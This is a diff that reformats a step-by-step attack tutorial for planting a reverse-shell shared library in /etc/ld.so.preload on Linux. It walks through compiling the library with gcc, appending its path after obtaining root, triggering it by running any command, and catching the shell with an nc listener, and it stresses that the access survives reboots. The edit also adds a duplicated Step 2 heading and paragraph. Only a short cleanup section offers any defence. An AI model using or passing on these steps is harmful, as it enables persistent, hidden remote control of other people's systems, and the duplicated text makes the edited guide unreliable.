@@ -14,11 +14,10 @@ Mechanism: The dynamic linker (ld.so) checks the /etc/ld.so.preload file on syst
 Step 2: Creating a Malicious Shared Library
 First, you need to create a custom shared library that will be injected when a process starts. This library can contain malicious code, such as a reverse shell, a keylogger, or other persistent malware.
 
+### Step 2: Creating a Malicious Shared Library
+First, you need to create a custom shared library that will be injected when a process starts. This library can contain malicious code, such as a reverse shell, a keylogger, or other persistent malware.
 Code for a Malicious Shared Library (example: reverse shell):
 
-c
-Copy
-Edit
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -39,13 +38,10 @@ Steps to compile the malicious shared library:
 
 Save the above code into a file called reverse_shell.c.
 Compile it into a shared library:
-bash
-Copy
-Edit
 gcc -shared -fPIC -o reverse_shell.so reverse_shell.c
 This creates the reverse_shell.so shared library, which will execute a reverse shell to the attacker's IP and port when any process is started.
 
-Step 3: Modifying /etc/ld.so.preload
+### Step 3: Modifying /etc/ld.so.preload
 Once the malicious shared library is compiled, the next step is to modify the /etc/ld.so.preload file to ensure that the malicious library is loaded system-wide whenever a process starts.
 
 1. Check if /etc/ld.so.preload exists:
@@ -60,34 +56,25 @@ Since modifying /etc/ld.so.preload requires root privileges, you’ll need to es
 
 Assuming you've gained root access, you can modify /etc/ld.so.preload by appending the path of the malicious shared library:
 
-bash
-Copy
-Edit
 echo "/path/to/reverse_shell.so" >> /etc/ld.so.preload
 Make sure to replace /path/to/reverse_shell.so with the actual path to your malicious shared library.
 
-Step 4: Test the Exploit
+### Step 4: Test the Exploit
 At this point, the malicious library is set to be loaded every time any dynamically linked process starts. To test the exploit, simply start a new process. For example, try running:
 
-bash
-Copy
-Edit
 ls
 This will run the ls command, but because of the /etc/ld.so.preload file, the reverse shell library will be loaded first, and it will attempt to connect to the attacker's machine.
 
-Step 5: Set up Listener on Attacker's Machine
+### Step 5: Set up Listener on Attacker's Machine
 To receive the reverse shell, you need to set up a listener on the attacker's machine using Netcat (nc). On your attacker's machine:
 
-bash
-Copy
-Edit
 nc -lvp 4444
 Make sure that port 4444 (or whatever port you specified) is open and listening for connections.
 
-Step 6: Persistent Execution
+### Step 6: Persistent Execution
 Since /etc/ld.so.preload is applied system-wide, this technique will survive reboots and user logins as long as the malicious library remains in the specified path and /etc/ld.so.preload is not modified. This gives the attacker full persistence on the system.
 
-Step 7: Cleanup and Mitigation
+### Step 7: Cleanup and Mitigation
 To remove the malicious payload, you would simply need to:
 
 Remove the entry from /etc/ld.so.preload:
